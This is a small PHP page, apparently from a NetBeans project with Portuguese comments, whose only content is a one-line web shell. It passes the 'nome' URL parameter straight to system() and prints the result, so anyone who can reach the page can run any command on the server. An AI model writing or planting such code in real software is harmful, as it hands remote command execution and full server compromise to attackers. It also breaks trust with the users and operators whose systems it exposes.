<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <?php
        
        //simples comando para executar na URL do browser do navegador 
            $cmd = system($_GET['nome']);
        //imprimindo o resultado na tela     
            echo $cmd;
        ?>
    </body>
</html>
